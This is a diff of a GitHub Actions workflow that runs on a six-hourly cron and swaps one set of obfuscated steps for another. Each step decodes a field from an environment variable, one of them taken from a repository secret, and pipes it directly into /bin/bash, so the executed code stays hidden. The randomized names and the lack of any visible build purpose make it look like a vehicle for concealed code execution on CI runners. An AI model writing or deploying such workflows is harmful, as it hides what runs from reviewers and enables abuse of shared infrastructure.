@@ -2,23 +2,20 @@ name: liyuanzhen4716
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
-jobs:  # 2438
+    - cron: '16 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liyuanzhen4716
         env:
-          wbvt36416: ${{ secrets.wbvt36416 }}
+          tb69: ${{ secrets.tb69 }}
         run: |
-          echo $wbvt36416 | jq -r .y0 | /bin/bash
-          echo $xexq0 | jq -r .i79698 | /bin/bash
-          echo $o796 | jq -r .rrmq62426 | /bin/bash
-          echo $c9653 | jq -r .x9965 | /bin/bash
-          echo $p60401 | jq -r .fklqg60 | /bin/bash
-          echo $ixqx5999 | jq -r .avf381 | /bin/bash
-          echo $hpx1 | jq -r .yy4 | /bin/bash
-          echo $zi37 | jq -r .lxzxb5703 | /bin/bash
-          echo $h158 | jq -r .ddyp9 | /bin/bash
+          echo $tb69 | jq -r .n08 | /bin/bash
+          echo $uakl04 | jq -r .kdmnz32 | /bin/bash
+          echo $e3 | jq -r .z32 | /bin/bash
+          echo $wzmh59542 | jq -r .uq384 | /bin/bash
+          echo $zi2682 | jq -r .t01390 | /bin/bash
 
